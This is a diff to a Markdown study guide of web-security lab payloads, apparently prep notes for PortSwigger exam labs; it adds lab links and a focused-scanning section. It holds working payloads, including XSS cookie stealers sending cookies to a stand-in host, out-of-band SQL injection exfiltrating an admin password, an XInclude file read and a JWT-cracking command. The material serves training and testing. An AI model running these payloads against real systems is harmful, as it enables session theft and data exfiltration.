@@ -122,7 +122,7 @@ document.write('<img src="http://exploit.net?cookieStealer='+document.cookie+'" 
 </script>
 ```  
 
->**Fetch API** JavaScript Cookie Stealer payload in blog post comment.  
+>**Fetch API** JavaScript Cookie Stealer payload in Blog post comment.  
 
 ```JavaScript
 <script>
@@ -133,6 +133,8 @@ body:document.cookie
 });
 </script>
 ```  
+
+[PortSwigger Lab: Exploiting cross-site scripting to steal cookies](https://portswigger.net/web-security/cross-site-scripting/exploiting/lab-stealing-cookies)  
 
 ## Host Header Poison - forgot-password
 
@@ -330,11 +332,13 @@ Connection: close
 
 ![Identify the input parameter vulnerable to SQL injection](identify-sqli-parameter.png)  
 
->Out of band data exfiltration SQL query, namely a tracking cookie.  
+>Out of band data exfiltration Blind SQL query, namely a tracking cookie.  
 
 ```sql
 TrackingId=x'+UNION+SELECT+EXTRACTVALUE(xmltype('<%3fxml+version%3d"1.0"+encoding%3d"UTF-8"%3f><!DOCTYPE+root+[+<!ENTITY+%25+remote+SYSTEM+"http%3a//'||(SELECT+password+FROM+users+WHERE+username%3d'administrator')||'.BURP-COLLABORATOR-SUBDOMAIN/">+%25remote%3b]>'),'/l')+FROM+dual--
 ```  
+
+[PortSwigger Lab: Blind SQL injection with out-of-band data exfiltration](https://portswigger.net/web-security/sql-injection/blind/lab-out-of-band-data-exfiltration)  
 
 <sup>Using SQLMAP to enumerate tracking cookie.</sup>  
 
@@ -508,7 +512,7 @@ Host: COLLABORATOR.DOMAIN
 
 ### SSRF redirect_uris  
 
->POST request to register data to the clien application with redirect URL endpoint in JSON body. Provide a redirect_uris array containing an arbitrary whitelist of callback URIs.  
+>POST request to register data to the clien application with redirect URL endpoint in JSON body. Provide a redirect_uris array containing an arbitrary whitelist of callback URIs. Observe the redirect_uri.  
 
 ```html
 POST /reg HTTP/1.1
@@ -825,5 +829,15 @@ hashcat -a 0 -m 16500 <YOUR-JWT> /path/to/jwt.secrets.list
 
 <sup> JWT section ...need more input...</sup>  
 
+## Focues Scanning 
 
+>Due to the tight time limit during engagements, scan defined insertion points for specific requests.  
+
+![scan-defined-insertion-points](scan-defined-insertion-points.png)  
+
+>Scanner detected xmlns on stockId parameter and can lead to reading file on host.  
+
+```xml
+<foo xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include parse="text" href="file:///home/carlos/secret"/></foo>
+```
 [My YouTube Exam Study Music Playlist](https://youtube.com/playlist?list=PLsDxQTEdg_YlA_fNwv4_tQAYYkIMfY5NY)  
